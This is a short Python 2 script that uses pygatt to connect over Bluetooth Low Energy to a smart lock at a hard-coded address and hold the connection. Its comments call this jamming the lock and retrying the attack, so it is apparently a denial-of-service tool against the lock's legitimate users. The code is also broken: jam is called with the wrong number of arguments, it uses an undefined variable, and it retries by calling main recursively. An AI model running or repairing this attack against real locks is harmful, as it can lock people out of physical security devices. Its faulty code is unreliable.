#!/usr/bin/python
import pygatt
from pygatt.exceptions import NotConnectedError

#The lock to jams BR_ADD value
LOCK_ADDRESS = "f0:91:0F:50:52:31"
#This is required to connect due to BLE random addressing.
ADDRESS_TYPE = pygatt.BLEAddressType.random


# Main method start adapter then call jam method, handling the fact
def main():
    adapter = pygatt.backends.GATTToolBackend()
    adapter.start()
    connected = False
    while True:
        #Capture if we can't connect to the lock.
        try:
            jam(adapter, connected)
        except NotConnectedError:
            #Retry attack.
            main()

def jam(adapter):
    #Connect to the lock making a device object.
    device = adapter.connect(LOCK_ADDRESS, address_type = ADDRESS_TYPE)
    while True:
        #Check if we can ask the lock for it's characteristics
        if device.discover_characteristics() != {}:
            if connected:
                print "Still connected ..."
            else:
                connected = True
                print "Connected to Lock"
        else:
            print "Connection lost"
            connected = False
            main()

if __name__ == "__main__":main()
